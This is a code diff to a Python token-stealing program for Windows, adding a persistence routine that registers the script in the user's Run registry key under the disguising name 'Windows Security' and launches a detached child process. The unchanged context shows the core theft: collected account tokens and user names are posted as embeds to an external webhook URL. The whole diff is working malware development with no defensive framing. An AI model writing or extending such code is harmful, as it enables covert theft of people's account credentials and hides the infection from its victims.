@@ -8,13 +8,25 @@ import requests
 import win32crypt
 from Cryptodome.Cipher import AES
 import re
-import ctypes
+import winreg
 
 WEBHOOK_URL = 'INSERT_WEBHOOK'
-
 DETACHED_PROCESS = 0x00000008
 
+def add_to_startup():
+    exe_path = sys.executable
+    script_path = os.path.abspath(sys.argv[0])
+    cmd = f'"{exe_path}" "{script_path}"'
+    try:
+        key = winreg.HKEY_CURRENT_USER
+        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg:
+            winreg.SetValueEx(reg, "Windows Security", 0, winreg.REG_SZ, cmd)
+    except Exception as e:
+        pass
+
 if "--child" not in sys.argv:
+    add_to_startup()
     subprocess.Popen(
         [sys.executable, __file__, "--child"],
         creationflags=DETACHED_PROCESS
@@ -71,14 +83,12 @@ def grab_and_send():
             "color": 0xFF0000,
             "fields": []
         }
-
         for token, user in found.items():
             embed["fields"].append({
                 "name": user,
                 "value": f"{token}",
                 "inline": False
             })
-
         data = {"embeds": [embed]}
         requests.post(WEBHOOK_URL, json=data)
 
